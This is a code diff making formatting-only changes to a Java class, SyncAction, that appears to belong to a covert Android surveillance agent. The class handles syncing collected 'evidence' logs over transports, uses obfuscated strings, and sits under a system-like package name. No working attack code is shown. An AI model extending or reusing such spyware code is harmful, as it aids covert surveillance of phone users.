@@ -9,9 +9,7 @@
 
 package com.android.syssetup.action;
 
-import java.util.Date;
-import java.util.Vector;
-
+import com.android.mm.M;
 import com.android.syssetup.Beep;
 import com.android.syssetup.Status;
 import com.android.syssetup.Trigger;
@@ -24,9 +22,12 @@ import com.android.syssetup.evidence.EvidenceCollector;
 import com.android.syssetup.interfaces.iProtocol;
 import com.android.syssetup.manager.ManagerModule;
 import com.android.syssetup.util.Check;
-import com.android.mm.M;
+
+import java.util.Date;
+import java.util.Vector;
 
 // TODO: Auto-generated Javadoc
+
 /**
  * The Class SyncAction.
  */
@@ -34,28 +35,36 @@ public abstract class SyncAction extends SubActionSlow {
 
 	private static final String TAG = "SyncAction"; //$NON-NLS-1$
 
-	/** The log collector. */
+	/**
+	 * The log collector.
+	 */
 	protected EvidenceCollector logCollector;
 
-	/** The agent manager. */
+	/**
+	 * The agent manager.
+	 */
 	protected ManagerModule moduleManager;
 	// protected Transport[] transports = new Transport[Transport.NUM];
-	/** The transports. */
+	/**
+	 * The transports.
+	 */
 	protected Vector<Object> transports;
 
-	/** The protocol. */
+	/**
+	 * The protocol.
+	 */
 	protected iProtocol protocol;
 
-	/** The initialized. */
+	/**
+	 * The initialized.
+	 */
 	protected boolean initialized;
 
 	/**
 	 * Instantiates a new sync action.
-	 * 
-	 * @param type
-	 *            the action id
-	 * @param jsubaction
-	 *            the conf params
+	 *
+	 * @param type       the action id
+	 * @param jsubaction the conf params
 	 */
 	public SyncAction(final ConfAction jsubaction) {
 		super(jsubaction);
@@ -104,7 +113,7 @@ public abstract class SyncAction extends SubActionSlow {
 		moduleManager.resetIncrementalLogs();
 
 		boolean ret = false;
-		
+
 		if (Cfg.DEMO) {
 			Beep.beep();
 			Status.self().makeToast(M.e("AGENT synchronization in progress"));
@@ -197,7 +206,7 @@ public abstract class SyncAction extends SubActionSlow {
 
 	/**
 	 * Inits the transport.
-	 * 
+	 *
 	 * @return true, if successful
 	 */
 	protected abstract boolean initTransport();
